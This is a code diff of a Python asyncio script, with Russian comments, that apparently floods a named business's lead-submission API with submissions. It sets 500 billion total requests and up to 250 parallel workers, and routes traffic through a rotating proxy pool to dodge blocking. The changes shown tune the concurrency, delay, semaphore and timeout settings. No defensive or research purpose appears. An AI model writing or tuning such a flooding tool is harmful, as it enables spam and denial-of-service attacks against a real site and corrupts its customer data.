@@ -22,8 +22,8 @@ from aiohttp_socks import ProxyConnector
 TARGET_URL = "https://avto-trak.com/api/leads" 
 
 TOTAL_REQUESTS = 500000000000       # Общее количество запросов
-DELAY_BETWEEN_REQ = 0.05      # Пауза перед отправкой следующего запроса в рамках воркера
-MAX_CONCURRENT = 150     # Количество параллельных воркеров (потоков)
+DELAY_BETWEEN_REQ = 5      # Пауза перед отправкой следующего запроса в рамках воркера
+MAX_CONCURRENT = 250     # Количество параллельных воркеров (потоков)
 
 init(autoreset=True)
 
@@ -44,7 +44,7 @@ fail_count = 0
 counter_lock = asyncio.Lock()
 file_lock = asyncio.Lock()
 
-send_semaphore = asyncio.Semaphore(5)
+send_semaphore = asyncio.Semaphore(8)
 
 class ProxyPool:
     def __init__(self):
@@ -172,7 +172,7 @@ async def send_lead_task(task_id, payload):
                 else:
                     connector = aiohttp.TCPConnector(use_dns_cache=True, ttl_dns_cache=3, ssl=ssl_context)
 
-                timeout = aiohttp.ClientTimeout(total=30)
+                timeout = aiohttp.ClientTimeout(total=15)
 
                 try:
                     async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
